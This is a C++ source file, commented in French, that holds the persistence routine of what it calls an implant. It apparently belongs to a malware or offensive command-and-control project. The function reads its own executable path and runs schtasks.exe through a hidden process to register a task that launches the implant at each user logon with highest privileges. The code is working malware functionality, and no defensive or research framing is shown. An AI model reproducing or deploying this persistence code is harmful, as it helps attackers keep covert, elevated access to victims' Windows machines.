#include "persistence.h"
#include "config.h"
#include "error.h"
#include <windows.h>
#include <iostream>

bool install_persistence() {
    char exe_path[MAX_PATH];
    if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) == 0) {
        std::cerr << format_last_error("impossible de recuperer le chemin de l'implant") << std::endl;
        return false;
    }

    std::string task_name = TaskName;

    // On entoure le chemin de l'exe de doubles guillemets pour gérer les espaces
    std::string quoted_exe_path = "\"\\\"" + std::string(exe_path) + "\\\"\"";

    // On utilise le chemin complet de schtasks.exe + /RL HIGHEST
    std::string command = "C:\\Windows\\System32\\schtasks.exe /Create /SC ONLOGON /TN \""
        + task_name + "\" /TR " + quoted_exe_path + " /RL HIGHEST /F";

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    char cmd_buffer[2048];
    strcpy_s(cmd_buffer, command.c_str());

    // bInheritHandles = TRUE : schtasks herite de la console et peut donc
    // expliquer lui-meme son echec (visible en build Debug).
    if (!CreateProcessA(NULL, cmd_buffer, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::cerr << format_last_error("impossible de lancer schtasks") << std::endl;
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exit_code = 0;
    GetExitCodeProcess(pi.hProcess, &exit_code);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (exit_code != 0) {
        // Un code de sortie de processus n'est pas un code d'erreur Win32 :
        // le passer a FormatMessage donnerait un texte trompeur.
        std::cerr << "schtasks a echoue (code de sortie " << exit_code << ")" << std::endl;
        return false;
    }
    return true;
}